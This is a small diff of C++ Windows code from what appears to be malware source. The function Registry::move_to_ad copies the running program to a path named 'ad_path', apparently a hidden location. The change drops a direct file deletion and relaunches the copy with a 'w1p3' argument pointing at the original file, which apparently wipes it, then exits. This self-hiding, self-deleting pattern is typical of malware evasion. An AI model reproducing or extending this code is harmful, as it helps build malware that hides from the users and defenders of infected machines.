@@ -159,13 +159,16 @@ void Registry::move_to_ad()
 
 	CloseHandle(curr_file);
 	CloseHandle(remote_file);
-	DeleteFileA(curr_path);
 
 	STARTUPINFOA s_info = { sizeof(s_info) };;
 	PROCESS_INFORMATION p_info;
-	
+
+	char* cmd_to_pass = new char[2000];
+	StringCchCopyA(cmd_to_pass, 2000, "w1p3 ");
+
+	StringCchCatA(cmd_to_pass, 2000, curr_path);
 	CreateProcessA(ad_path,
-		NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &s_info, &p_info);
+		cmd_to_pass, NULL, NULL, FALSE, NULL, NULL, NULL, &s_info, &p_info);
 
 	ExitProcess(0);
 }
